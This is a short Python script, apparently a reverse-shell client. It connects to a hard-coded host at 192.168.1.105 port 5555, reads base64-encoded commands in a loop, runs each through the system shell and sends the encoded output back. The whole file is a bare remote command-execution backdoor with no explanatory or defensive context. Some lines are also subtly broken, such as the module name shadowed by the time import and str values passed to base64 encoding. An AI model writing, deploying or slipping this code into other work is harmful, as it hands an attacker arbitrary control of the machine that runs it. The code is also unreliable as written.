import socket
import subprocess
import base64
import time
from time import time
HOST = '192.168.1.105'
PORT = 5555
s = socket.socket()
s.connect((HOST, PORT))
msg = base64.b64decode(s.recv(1024).decode())

while True:
    cmd = str(base64.b64decode(s.recv(1024).decode()),"utf-8")
    print(cmd)
    
    try:
        print("executing "+cmd)
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = base64.b64encode(str(e))

    if len(result) == 0:
        result = 'OK'

    s.send(base64.b64encode(str(result)))

s.close()